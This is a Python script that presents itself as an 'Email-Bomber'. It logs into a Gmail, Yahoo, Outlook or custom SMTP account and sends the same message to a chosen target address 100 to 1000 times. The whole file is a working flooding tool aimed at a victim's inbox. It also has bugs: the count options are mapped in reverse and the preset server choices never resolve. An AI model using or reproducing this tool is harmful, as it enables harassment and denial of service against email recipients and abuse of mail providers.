import smtplib
import sys
from enum import Enum

from enum import Enum

class color(Enum):
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    RED     = '\033[91m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    GREY    = '\033[90m'
    BOLD    = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET   = '\033[0m'

def banner():
    print(color.GREEN.value+'+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(color.GREEN.value+'+[+[+[ made with codes v1.0 ]+]+]+')
    print(color.GREEN.value+'''
                 . . .                         
              \|/                          
            `--+--'                        
              /|\                          
             ' | '                         
               |                           
               |                           
           ,--'#`--.                       
           |#######|                       
        _.-'#######`-._                    
     ,-'###############`-.                 
   ,'#####################`,               
  /#########################\              
 |###########################|             
|#############################|            
|#############################|            
|#############################|            
|#############################|            
 |###########################|             
  \#########################/              
   `.#####################,'               
     `._###############_,'                 
        `--..#####..--'
    ''')

class Email_Bomber:
    count=0
    def __init__(self):
        try:
            print(color.RED.value+'+[+[+[ Initializing program ]+]+]+')
            self.target=input(color.GREEN.value+'Enter the target email <: ')
            self.mode=input(color.GREEN.value+'Enter BOMB mode (1,2,3,4) || 1: (1000) 2: (500) 3: (250) 4: (100) ')
            if int(self.mode)>4 or int(self.mode)<1:
                print('Error: Invalid Option')
                sys.exit(1)
        except Exception as e:
            print(f'Error: {e}')
    def bomb(self):
        try:
            print(color.RED.value+'+[+[+[ Setting up bomb ]+]+]+')
            self.amount=None
            match self.mode:
                case '1':
                    self.amount=100
                case '2':
                    self.amount=250
                case '3':
                    self.amount=500
                case '4':
                    self.amount=1000
        except Exception as e:
            print(f'ERROR: {e}')
    def email(self):
        try:
            print(color.RED.value+'+[+[+[ Setting up bomb ]+]+]+')
            self.server=input(color.GREEN.value+'Enter server or select pre-made options 1:Gmail 2:Yahoo 3:Outlook <:')
            premade=['1','2','3']
            default_port=True
            if self.server not in premade:
                default_port=False
                self.port=int(input(color.GREEN.value+'Enter port number <: '))
            if default_port:
                self.port=587
            match self.server:
                case 1:
                    self.server='smtp.gmail.com'
                case 2:
                    self.server='smtp.mail.yahoo.com'
                case 3:
                    self.server='smtp.mail.outlook.com'
            self.fromAddress=input(color.GREEN.value+'Enter address mail')
            self.password = input(color.GREEN.value + 'Enter password mail')
            self.subject = input(color.GREEN.value + 'Enter subject')
            self.message=input(color.GREEN.value+'Enter message')
            self.msg=f'''From: {self.fromAddress}\nTo: {self.target}\nSubject {self.subject}\nMessage: {self.message}'''
            self.s=smtplib.SMTP(self.server,self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddress,self.password)
        except Exception as e:
            print('Error: {e}')
    def send(self):
        try:
            self.s.sendmail(self.fromAddress,self.target,self.msg)
            self.count+=1
            print(color.YELLOW.value+f'BOMB {self.count}')
        except Exception as e:
            print(f'Error: {e}')
    def attack(self):
        print(color.RED.value+'+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(color.RED.value+'+[+[+[ Attack finished ]+]+]+')
        sys.exit(1)
if __name__=='__main__':
    banner()
    bomb=Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
